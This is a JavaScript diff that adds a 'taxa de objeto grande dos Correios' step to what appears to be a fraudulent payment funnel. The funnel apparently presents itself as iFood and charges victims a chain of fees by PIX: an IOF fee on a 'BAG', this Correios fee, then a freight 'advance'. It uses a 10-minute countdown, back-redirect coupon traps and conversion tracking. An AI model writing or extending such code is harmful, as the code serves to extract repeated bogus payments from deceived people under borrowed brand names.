@@ -176,6 +176,9 @@ document.addEventListener('DOMContentLoaded', () => {
         case 'upsell-iof':
             initUpsellIof();
             break;
+        case 'upsell-correios':
+            initUpsellCorreios();
+            break;
         case 'upsell':
             initUpsell();
             break;
@@ -670,7 +673,7 @@ function getBackRedirectOffer(page, level = 1) {
             amountOff: 5
         };
     }
-    if (page === 'upsell' || page === 'upsell-iof') {
+    if (page === 'upsell' || page === 'upsell-iof' || page === 'upsell-correios') {
         return {
             mode: 'coupon',
             badge: 'Desconto exclusivo',
@@ -2361,8 +2364,8 @@ function initUpsellIof() {
     };
 
     const goToSecondUpsell = () => {
-        setStage('upsell');
-        redirect('upsell.html');
+        setStage('upsell_correios');
+        redirect('upsell-correios.html');
     };
 
     const handleAccept = async (event) => {
@@ -2396,7 +2399,7 @@ function initUpsellIof() {
                     title: 'Taxa de IOF da BAG',
                     price: offerPrice,
                     previousTxid: String(pix?.idTransaction || '').trim(),
-                    targetAfterPaid: 'upsell.html'
+                    targetAfterPaid: 'upsell-correios.html'
                 }
             });
         } catch (error) {
@@ -2423,6 +2426,134 @@ function initUpsellIof() {
         showToast('Sem problemas. Vamos para o proximo passo.', 'info');
         goToSecondUpsell();
     });
+}
+
+function initUpsellCorreios() {
+    if (!requirePersonal()) return;
+    if (!requireAddress()) return;
+
+    setStage('upsell_correios');
+    const personal = loadPersonal();
+    const shippingStored = loadShipping();
+    const shipping = isShippingSelectionComplete(shippingStored) ? shippingStored : null;
+    const pix = loadPix();
+    const offerPrice = 12.96;
+
+    trackLead('upsell_correios_view', { stage: 'upsell_correios', shipping, pix, offerPrice });
+
+    const leadName = document.getElementById('upsell-correios-lead-name');
+    const currentFrete = document.getElementById('upsell-correios-current-frete');
+    const currentTxid = document.getElementById('upsell-correios-current-txid');
+    const btnAccept = document.getElementById('btn-upsell-correios-accept');
+    const btnSkip = document.getElementById('btn-upsell-correios-skip');
+    const loading = document.getElementById('upsell-correios-loading');
+    const timerLabel = document.getElementById('upsell-correios-timer');
+    const priceLabels = Array.from(
+        document.querySelectorAll('[data-upsell-correios-price], #upsell-correios-price')
+    );
+    const acceptIdleLabel = btnAccept?.textContent || 'Pagar taxa de objeto grande R$ 12,96';
+    let submitInFlight = false;
+
+    if (leadName && personal?.name) {
+        const firstName = String(personal.name || '').trim().split(/\s+/)[0];
+        leadName.textContent = firstName || 'Parceiro';
+    }
+    if (currentFrete) {
+        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
+    }
+    if (currentTxid) {
+        const txid = String(pix?.idTransaction || '').trim();
+        currentTxid.textContent = txid ? txid.slice(-8) : '--';
+    }
+    priceLabels.forEach((el) => {
+        if (!el) return;
+        el.textContent = formatCurrency(offerPrice);
+    });
+
+    const setLoading = (active) => {
+        if (btnAccept) btnAccept.disabled = active;
+        if (btnSkip) btnSkip.disabled = active;
+        if (loading) loading.classList.toggle('hidden', !active);
+    };
+
+    const startCountdown = () => {
+        if (!timerLabel) return;
+        const storageKey = 'ifood_upsell_correios_deadline_ts';
+        const now = Date.now();
+        const fallbackDeadline = now + (10 * 60 * 1000);
+        const savedRaw = Number(sessionStorage.getItem(storageKey) || 0);
+        const deadline = savedRaw > now ? savedRaw : fallbackDeadline;
+        sessionStorage.setItem(storageKey, String(deadline));
+
+        const render = () => {
+            const diff = Math.max(0, deadline - Date.now());
+            const totalSeconds = Math.floor(diff / 1000);
+            const mm = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
+            const ss = String(totalSeconds % 60).padStart(2, '0');
+            timerLabel.textContent = `${mm}:${ss}`;
+            return diff > 0;
+        };
+
+        render();
+        const interval = window.setInterval(() => {
+            const keep = render();
+            if (!keep) window.clearInterval(interval);
+        }, 1000);
+    };
+
+    const goToThirdUpsell = () => {
+        setStage('upsell');
+        redirect('upsell.html');
+    };
+
+    btnAccept?.addEventListener('click', async () => {
+        if (submitInFlight) return;
+        submitInFlight = true;
+
+        const correiosShipping = {
+            id: 'taxa_objeto_grande_correios',
+            name: 'Taxa de objeto grande dos Correios',
+            eta: 'Despacho com validacao de tamanho',
+            price: offerPrice
+        };
+
+        setLoading(true);
+        trackLead('upsell_correios_accept', {
+            stage: 'upsell_correios',
+            shipping: correiosShipping,
+            baseShipping: shipping || null,
+            previousPix: pix || null,
+            amount: offerPrice
+        });
+
+        try {
+            btnAccept.textContent = 'Gerando PIX da taxa dos Correios...';
+            await createPixCharge(correiosShipping, 0, {
+                sourceStage: 'upsell_correios',
+                upsell: {
+                    enabled: true,
+                    kind: 'taxa_objeto_grande_correios',
+                    title: 'Taxa de objeto grande dos Correios',
+                    price: offerPrice,
+                    previousTxid: String(pix?.idTransaction || '').trim(),
+                    targetAfterPaid: 'upsell.html'
+                }
+            });
+        } catch (error) {
+            btnAccept.textContent = acceptIdleLabel;
+            showToast(error.message || 'Nao foi possivel gerar o PIX da taxa dos Correios.', 'error');
+            setLoading(false);
+            submitInFlight = false;
+        }
+    });
+
+    btnSkip?.addEventListener('click', () => {
+        trackLead('upsell_correios_decline', { stage: 'upsell_correios', shipping, pix, amount: offerPrice });
+        showToast('Tudo certo. Vamos para o adiantamento de frete.', 'info');
+        goToThirdUpsell();
+    });
+
+    startCountdown();
 }
 
 function initUpsell() {
@@ -2606,7 +2737,7 @@ function initPix() {
         pix?.isUpsell ||
         pix?.upsell?.enabled ||
         String(pix?.shippingId || '').trim() === 'expresso_1dia' ||
-        /adiantamento|prioridade|expresso/i.test(String(pix?.shippingName || ''))
+        /adiantamento|prioridade|expresso|correio|objeto grande/i.test(String(pix?.shippingName || ''))
     );
     const upsellKind = String(pix?.upsell?.kind || '').trim().toLowerCase();
     const upsellTargetAfterPaid = String(pix?.upsell?.targetAfterPaid || '').trim();
@@ -2616,6 +2747,14 @@ function initPix() {
             /iof/.test(String(pix?.shippingId || '').toLowerCase()) ||
             /iof/.test(String(pix?.shippingName || '').toLowerCase()) ||
             /iof/.test(String(pix?.upsell?.title || '').toLowerCase())
+        )
+    );
+    const isCorreiosUpsellPix = Boolean(
+        isUpsellPix && !isIofUpsellPix && (
+            /correios|objeto_grande|objeto grande/.test(upsellKind) ||
+            /correios|objeto_grande|objeto grande/.test(String(pix?.shippingId || '').toLowerCase()) ||
+            /correios|objeto_grande|objeto grande/.test(String(pix?.shippingName || '').toLowerCase()) ||
+            /correios|objeto_grande|objeto grande/.test(String(pix?.upsell?.title || '').toLowerCase())
         )
     );
 
@@ -2790,13 +2929,16 @@ function initPix() {
 
     const resolveUpsellPaidRedirect = () => {
         if (upsellTargetAfterPaid) return upsellTargetAfterPaid;
-        return isIofUpsellPix ? 'upsell.html' : 'upsell.html?paid=1';
+        if (isIofUpsellPix) return 'upsell-correios.html';
+        if (isCorreiosUpsellPix) return 'upsell.html';
+        return 'upsell.html?paid=1';
     };
 
     const resolveStageFromRedirect = (targetUrl) => {
         const normalized = String(targetUrl || '').trim().toLowerCase();
         if (!normalized) return 'upsell';
         if (normalized.includes('upsell-iof')) return 'upsell_iof';
+        if (normalized.includes('upsell-correios')) return 'upsell_correios';
         if (normalized.includes('upsell')) return 'upsell';
         return 'checkout';
     };
@@ -2833,7 +2975,10 @@ function initPix() {
         if (isUpsellPix) {
             const paidTarget = resolveUpsellPaidRedirect();
             const targetStage = resolveStageFromRedirect(paidTarget);
-            trackLead(isIofUpsellPix ? 'upsell_iof_pix_paid_redirect' : 'upsell_pix_paid_redirect', {
+            const redirectEvent = isIofUpsellPix
+                ? 'upsell_iof_pix_paid_redirect'
+                : (isCorreiosUpsellPix ? 'upsell_correios_pix_paid_redirect' : 'upsell_pix_paid_redirect');
+            trackLead(redirectEvent, {
                 stage: 'pix',
                 shipping,
                 pix: {
@@ -2843,8 +2988,10 @@ function initPix() {
             });
             showToast(
                 isIofUpsellPix
-                    ? 'Pagamento confirmado. Seguindo para o proximo beneficio.'
-                    : 'Pagamento confirmado. Prioridade ativada.',
+                    ? 'Pagamento confirmado. Seguindo para a taxa dos Correios.'
+                    : (isCorreiosUpsellPix
+                        ? 'Pagamento confirmado. Seguindo para o adiantamento do frete.'
+                        : 'Pagamento confirmado. Prioridade ativada.'),
                 'success'
             );
             if (pixIofStatus) pixIofStatus.textContent = 'Status: Pagamento confirmado';
@@ -3014,7 +3161,8 @@ function resolvePaidPixTarget(pix) {
         String(pixData?.shippingName || '').trim().toLowerCase(),
         String(pixData?.upsell?.title || '').trim().toLowerCase()
     ].join(' ');
-    if (/iof/.test(kind) || /iof/.test(hints)) return 'upsell.html';
+    if (/iof/.test(kind) || /iof/.test(hints)) return 'upsell-correios.html';
+    if (/correios|objeto_grande|objeto grande/.test(kind) || /correios|objeto_grande|objeto grande/.test(hints)) return 'upsell.html';
 
     return 'upsell.html?paid=1';
 }
@@ -3093,6 +3241,8 @@ function buildBackRedirectUrl(pageOverride) {
             return pixPending ? 'pix.html' : directCheckoutUrl();
         case 'upsell-iof':
             return 'upsell-iof.html';
+        case 'upsell-correios':
+            return 'upsell-correios.html';
         case 'upsell':
             return 'upsell.html';
         default:
@@ -3155,6 +3305,10 @@ function buildBackRedirectFallbackUrl(pageOverride) {
                 qp.set('br', String(Date.now()));
             });
         case 'upsell-iof':
+            return withParams('pix.html', (qp) => {
+                qp.set('br', String(Date.now()));
+            });
+        case 'upsell-correios':
             return withParams('pix.html', (qp) => {
                 qp.set('br', String(Date.now()));
             });
@@ -3321,7 +3475,8 @@ function initAdmin() {
         orderbump: { label: 'orderbump.html', desc: 'Oferta do Seguro Bag' },
         pix: { label: 'pix.html', desc: 'Pagamento via PIX' },
         'upsell-iof': { label: 'upsell-iof.html', desc: 'Upsell 1: taxa de IOF da bag' },
-        upsell: { label: 'upsell.html', desc: 'Upsell 2: prioridade de envio' }
+        'upsell-correios': { label: 'upsell-correios.html', desc: 'Upsell 2: taxa de objeto grande dos Correios' },
+        upsell: { label: 'upsell.html', desc: 'Upsell 3: adiantamento do frete' }
     };
     let currentSettings = null;
 
@@ -4046,7 +4201,7 @@ function initAdmin() {
         });
 
         if (pagesInsights) {
-            const order = ['home', 'quiz', 'personal', 'cep', 'processing', 'success', 'checkout', 'orderbump', 'pix', 'upsell-iof', 'upsell'];
+            const order = ['home', 'quiz', 'personal', 'cep', 'processing', 'success', 'checkout', 'orderbump', 'pix', 'upsell-iof', 'upsell-correios', 'upsell'];
             const map = new Map(rows.map((r) => [r.page, Number(r.total) || 0]));
             pagesInsights.innerHTML = '';
             let prevEffective = null;
@@ -5167,6 +5322,21 @@ function maybeTrackPixel(eventName, payload = {}) {
         });
     }
 
+    if (eventName === 'upsell_correios_view' && pixel.events?.checkout !== false) {
+        firePixelEvent('ViewContent', {
+            content_name: 'upsell_taxa_objeto_grande_correios',
+            content_category: 'upsell'
+        });
+    }
+
+    if (eventName === 'upsell_correios_accept' && pixel.events?.checkout !== false) {
+        firePixelEvent('AddToCart', {
+            content_name: 'upsell_taxa_objeto_grande_correios',
+            currency: 'BRL',
+            value: totalValue > 0 ? totalValue : 12.96
+        });
+    }
+
     if ((eventName === 'pix_created_front' || eventName === 'upsell_pix_created_front') && pixel.events?.checkout !== false) {
         firePixelEvent('AddPaymentInfo', {
             currency: 'BRL',
@@ -5389,6 +5559,7 @@ function resolveResumeUrl() {
     if (stage === 'orderbump') return 'orderbump';
     if (stage === 'pix') return 'pix';
     if (stage === 'upsell_iof') return 'upsell-iof';
+    if (stage === 'upsell_correios') return 'upsell-correios';
     if (stage === 'upsell') return 'upsell';
     if (stage === 'complete') return 'checkout';
     if (loadPersonal() && !loadAddress()) return 'endereco';
